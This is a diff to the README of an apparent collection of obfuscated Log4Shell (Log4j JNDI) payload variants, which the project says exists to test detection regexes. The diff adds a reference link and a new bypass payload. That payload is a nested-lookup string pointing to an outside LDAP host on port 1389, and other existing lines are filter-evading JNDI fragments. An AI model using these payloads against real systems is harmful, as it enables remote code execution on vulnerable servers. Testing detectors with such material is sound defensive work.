@@ -14,6 +14,7 @@ The goal is to allows testing detection regexes defined in protection systems.
 * https://twitter.com/anthrax0/status/1470276303773663233
 * https://twitter.com/log4j2rce/status/1469799982630944770
 * https://twitter.com/11xuxx/status/1471236310299906050
+* https://twitter.com/11xuxx/status/1471826191724257285
 * https://github.com/projectdiscovery/nuclei-templates/pull/3334/files
 * https://github.com/PortSwigger/log4shell-scanner/blob/master/src/main/kotlin/burp/BurpExtender.kt#L70
 * https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words/blob/main/src/main/java/log4j.java
@@ -97,4 +98,5 @@ j${main:\k5:-Nd}i${spring:k5:-:}
 j${sys:k5:-nD}${lower:i${web:k5:-:}}
 jn${date:}di${date:':'}
 jn${env::-}di:
+${jnd${123%25ff:-${123%25ff:-i:}}ldap://mydogsbutt.com:1389/o}
 ```
